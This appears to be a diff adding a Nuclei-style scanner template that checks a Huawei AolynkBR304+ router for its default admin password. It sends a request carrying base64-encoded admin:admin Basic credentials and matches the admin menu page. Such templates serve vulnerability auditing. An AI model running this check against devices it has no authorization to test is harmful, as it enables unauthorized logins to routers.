@@ -1,0 +1,25 @@
+id: AolynkBR304-weakPass
+
+info:
+  name: 华为AolynkBR304+智能安全路由器默认口令
+  author: Str1am
+  severity: high
+  tags: AolynkBR304,weakPass
+
+requests:
+  - raw:
+      - |
+        GET /index_main.html HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic YWRtaW46YWRtaW4=
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/menu_admin.html"
+        part: body
+        condition: and
